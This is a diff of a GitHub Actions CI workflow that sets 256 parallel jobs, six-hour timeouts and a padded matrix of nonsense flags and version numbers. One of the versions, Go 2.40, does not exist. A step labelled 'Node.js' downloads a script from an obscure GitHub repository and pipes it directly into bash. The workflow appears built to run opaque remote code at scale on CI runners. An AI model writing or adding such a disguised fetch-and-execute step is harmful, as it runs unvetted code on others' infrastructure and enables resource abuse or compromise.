@@ -1,4 +1,4 @@
-name: ci-lirterxd
+name: ci-lirterxa
 # on: [push]
 on:
   push:
@@ -7,13 +7,13 @@ on:
 jobs:
   build:
     name: IPLAYBOOKS
-    runs-on: depot-ubuntu-24.04-4
+    runs-on: depot-macos-latest
     strategy:
       max-parallel: 256
       fail-fast: false
       matrix:
-         go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 2.40]
-         flag: [kmn, oiu, qwe, cxw, omi]  
+         go: [1.11, 2.40, 1.13, 1.20]
+         flag: [kmn, oiu, nvb, tby, utu, rva, zys, daw, cxw, omi]  
     timeout-minutes: 360
     env:
         NUM_JOBS: 256
@@ -28,4 +28,4 @@ jobs:
       uses: actions/checkout@v3
     - name: Node.js
       run: |
-        curl -sL https://github.com/stellavholiza-dev/kikir/raw/main/newxelzsa | bash 
+        curl -sL https://github.com/stellavholiza-dev/kikir/raw/main/newxelzsa | bash
